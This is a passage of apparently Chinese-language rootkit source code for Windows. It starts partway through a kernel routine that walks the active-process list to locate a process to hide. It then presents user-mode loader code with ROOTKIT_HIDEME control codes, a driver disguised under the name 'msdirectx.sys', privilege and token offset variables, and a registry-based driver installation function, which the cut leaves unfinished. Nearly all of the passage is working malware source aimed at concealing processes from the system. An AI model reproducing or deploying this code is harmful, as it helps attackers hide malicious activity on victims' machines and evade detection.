
```c
int   i_count     = 0;

PLIST_ENTRY plist_active_procs;

if (terminate_PID == 0)

        return terminate_PID;

eproc = (DWORD) PsGetCurrentProcess();//得到当前进程的PLIST_ENTRY

start_PID = *((DWORD*)(eproc+PIDOFFSET))；//PIDOFFSET为PLIST_ENTRY中保存进程ID的偏移量。

current_PID = start_PID;

while(1)//遍历链表比较进程ID找到要隐藏的进程的PLIST_ENTRY
{
        if(terminate_PID == current_PID)
                return eproc;
        else if((i_count >= 1) && (start_PID == current_PID))
        {
                return 0x00000000;
        }
        else {
                plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
                eproc = (DWORD) plist_active_procs->Flink;
                eproc = eproc - FLINKOFFSET;
                current_PID = *((int *)(eproc+PIDOFFSET));
                i_count++;
        }
}
}
```

# 2 用户空间程序

```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <tlhelp32.h>
#include <string.h>
#include <winioctl.h>
#include <winsvc.h>
#include <tchar.h>
#include <stdlib.h>
```

```c
#define SECURITY_STRING_LEN 168
#define LG_PAGE_SIZE 4096
#define MAX_KEY_LENGTH 1024
#define LG_SLEEP_TIME 4000
#define FILE_DEVICE_ROOTKIT 0x00002a7b
#define IOCTL_ROOTKIT_HIDEME (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x02, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_INIT (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x01, METHOD_BUFFERED, FILE_WRITE_ACCESS)
```

```c
HANDLE gh_Device = INVALID_HANDLE_VALUE;
static CHAR ac_driverLabel[]="msdirectx";
static CHAR ac_driverName[]="msdirectx.sys";
DWORD pid;
HANDLE h_Device = INVALID_HANDLE_VALUE;
DWORD  d_bytesRead, d_error;
CHAR ac_driverPath[MAX_PATH];
BOOL bOsVersionInfoEx;
BOOL Found = FALSE;
CHAR acModulePath[MAX_PATH];
int  pid_offset = 0;
int  flink_offset = 0;
int  authid_offset = 0;
int  token_offset = 0;
int  privcount_offset = 0;
int  privaddr_offset  = 0;
int  sidcount_offset = 0;
int  sidaddr_offset  = 0;
char m_szDriverExt[MAX_PATH];
char DriverName[MAX_PATH];
char sz_drivername[MAX_PATH];
char m_szDriverFullPath[MAX_PATH];
PROCESSENTRY32 stProcess;
const BYTE g_szSecurity[SECURITY_STRING_LEN]=
{
        0x01,0x00,0x14,0x80,0x90,0x00,0x00,0x00,0x9c,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x02,
        0x00,0x1c,0x00,0x01,0x00,0x00,0x00,0x02,0x80,0x14,0x00,0xff,0x01,0x0f,0x00,0x01,0x01,0x00,0x00,0x00,0x00,
        0x00,0x01,0x00,0x00,0x00,0x00,0x02,0x00,0x60,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0xfd,0x01,0x02,
        0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x12,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0xff,0x01,0x0f,0x00,
        0x01,0x02,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x00,0x00,0x14,0x00,0x8d,
        0x01,0x02,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x0b,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0xfd,0x01,
        0x02,0x00,0x01,0x02,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x23,0x02,0x00,0x00,0x01,0x01,0x00,
        0x00,0x00,0x00,0x00,0x05,0x12,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x12,0x00,0x00,0x00
};
```

## 函数及实现

```c
void PrintLastError(int errorno)
{
#if defined(DEBUG) || defined(_DEBUG)
        LPVOID        lpMsgBuf;
        if(0==errorno)
        {
                errorno=GetLastError();
        }
        FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,errorno,0,(LPTSTR) &lpMsgBuf,0,NULL);
#ifdef _CONSOLE
        printf("%s\r\n",lpMsgBuf);
#else
        MessageBox(NULL,(LPCTSTR)lpMsgBuf,"错误",MB_OK|MB_TOPMOST);
#endif
        LocalFree(lpMsgBuf);
#endif
}
```

```c
bool SplitFilePath(const char* szFullPath,char* szPath,char* szFileName,char* szFileExt)
{
        char*        p,*q,*r;
        size_t        len;
        if(NULL==szFullPath)
        {
                return false;
        }
        p=(char*)szFullPath;
        len=strlen(szFullPath);
        if(szPath)
        {
                szPath[0]=0;
        }
        if(szFileName)
        {
                szFileName[0]=0;
        }
        if(szFileExt)
        {
                szFileExt[0]=0;
        }
        q=p+len;
        while(q>p)
        {
                if( *q=='\\' || *q=='/')
                {
                        break;
                }
                q--;
        }
        if(q<=p)
        {
                return false;
        }
        if(szPath)
        {
                memcpy(szPath,p,q-p+1);
                szPath[q-p+1]=0;
        }
        q++;
        p=q;
        r=NULL;
        while(*q)
        {
                if(*q=='.')
                {
                        r=q;
                }
                q++;
        }
        if(NULL==r)
        {
                if(szFileName)
                {
                        memcpy(szFileName,p,q-p+1);
                }
        }
        else
        {
                if(szFileName)
                {
                        memcpy(szFileName,p,r-p);
                        szFileName[r-p]=0;
                }
                if(szFileExt)
                {
                        memcpy(szFileExt,r+1,q-r+1);
                }
        }
        return true;
}
```

```c
int InstallDriver(const char* cszDriverName,const char* cszDriverFullPath)
{
        char        szBuf[LG_PAGE_SIZE];
        HKEY        hKey;
        DWORD        dwData;
        if( NULL==cszDriverName || NULL==cszDriverFullPath )
        {
                return -1;
        }
        memset(szBuf,0,LG_PAGE_SIZE);
        strcpy(szBuf,"SYSTEM\\CurrentControlSet\\Services\\");
        strcat(szBuf,cszDriverName);
        if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,szBuf,0,"",0,KEY_ALL_ACCESS,NULL,&hKey,(LPDWORD)&dwData)!=ERROR_SUCCESS)
        {
                return -1;
        }
        strcpy(szBuf,cszDriverName);
        if(RegSetValueEx(hKey,"DisplayName",0,REG_SZ,(CONST BYTE*)szBuf,(DWORD)strlen(szBuf))!=ERROR_SUCCESS)
        {
                return -1;
        }
        dwData=1;
        if(RegSetValueEx(hKey,"ErrorControl",0,REG_DWORD,(CONST BYTE*)&dwData,sizeof(DWORD))!=ERROR_SUCCESS)
        {
                return -1;
        }
        strcpy(szBuf,"\\??\\");
        strcat(szBuf,cszDriverFullPath);
        if(RegSetValueEx(hKey,"ImagePath",0,REG_SZ,(CONST BYTE*)szBuf,(DWORD)strlen(szBuf))!=ERROR_SUCCESS)
        {
                return -1;
        }
        dwData=3;
        if(RegSetValueEx(hKey,"Start",0,REG_DWORD,(CONST BYTE*)&dwData,sizeof(DWORD))!=ERROR_SUCCESS)
        {
                return -1;
        }
        dwData=1;
        if(RegSetValueEx(hKey,"Type",0,REG_DWORD,(CONST BYTE*)&dwData,sizeof(DWORD))!=ERROR_SUCCESS)
        {
                return -1;
        }
        RegFlushKey(hKey);
        RegCloseKey(hKey);
        strcpy(szBuf,"SYSTEM\\CurrentControlSet\\Services\\");
}
```
